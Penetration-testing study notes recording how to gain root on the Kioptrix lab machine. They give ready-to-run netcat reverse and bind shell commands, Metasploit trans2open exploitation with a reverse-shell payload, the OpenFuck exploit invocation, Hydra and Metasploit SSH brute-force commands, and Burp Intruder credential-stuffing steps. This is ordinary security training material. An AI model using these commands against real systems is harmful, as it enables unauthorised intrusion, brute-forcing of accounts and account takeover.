# Reverse Shells vs Bind Shells

## Reverse Shell
> - `nc` - netcat
>   - `nc -nvlp <port number>`
> - victim connects to attack box
>   - victim connecting / attack box listening
> - Most common shell by far

## Bind Shell
> - open a port on target machine, then attack box connects to victim
> - useful when bypassing a firewall or when reverse shell just doesn't work
> - netcat
>   - `nc <IP Address> <port number>`

<br /><br />

# Staged vs. Non-Staged Payloads

## Staged
> - Sends exploit shellcode in stages
> - Can be less stable
> - Example
>   - `windows/meterpreter/reverse_tcp`
>   - think of each slash as a stage

## Non-Staged
> - Send exploit shellcode all at once
> - Larger in size and doesn't always work
> - Example
>   - `windows/mterpreter_reverse_tcp`

##### `If one doesn't work, use the other`

<br /><br />

# Gaining root with Metasploit

## Metasploit
> `using Kioptrix test machine for these notes`
1. in metasploit console `search trans2open`
2. `use <linux option>`
   -  ##### We use Linux option, since we know the target is operating on a Linux distribution
3. `options`
4. `set rhosts <IP Address>`
5. `run`

> `Execute fails, shell dies repeatedly. Use non-staged payload instead.`
  
1. run `options` again to get payload options
2. `set payload linux/x86/shell_reverse_tcp`
   - ##### first non-staged payload found 
3. `run`

> `Successfully gain root access with remote shell`

## Manual Exploitation
- Using OpenLuck exploit listed under Vulnerabilities
- Install OpenLuck per instructions in GitHub repo for OpenLuck
  - `./OpenFuck`
    - brings up a "man page"
  - `./OpenFuck target box [port] [-c N]`
    - target &rarr; support offset
    - box &rarr; IP address or hostname
    - -c &rarr; open N connections, 40-50 if unknown
- `./OpenFuck 0x6b <IP Address> -c 40`

> `Successfully gain root access with remote shell`

<br /><br />

# Brute Force Attacks

## SSH
- Brute force is one of few ways to break through SSH
  - In a PenTest, it can be a good thing to try to get caught by the blue team
  
## Hydra
- `hydra -l root -P /usr/share/wordlists/metasploit/unix_password.txt ssh://<IP Address:Port> -t 4 -V`

## Metasploit
- `msfconsole`
- `search ssh`
  - `use scanner/ssh/ssh_login`
    - `options`
      - `set username root`
      - `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
      - `set rhosts 192.168.57.134`
    - `run`

<br /><br />

# Credential Stuffing and Password Spraying

## Credential Stuffing
> &rarr; Injecting breached account credentials in hopes of account takeover

## Burp Suite for Credential Stuffing
> - Through Proxy w/ intercept on
>   1. Rclick > send to intruder
>   2. Positions > clear
>   3. Select user/email & password field
>   4. Select attack type
>       - Sniper uses 1 param, pitchfork uses 2+
>   5. In first payload, paste list of users
>   6. In second payload, paste list of passwords
>   7. Start attack
> - Investigate responses
>      - status 200, 301 (redirect)
> - When doing a pentest on AD be careful not to lock out users
>    <br />&rarr; Ask what lockout policy is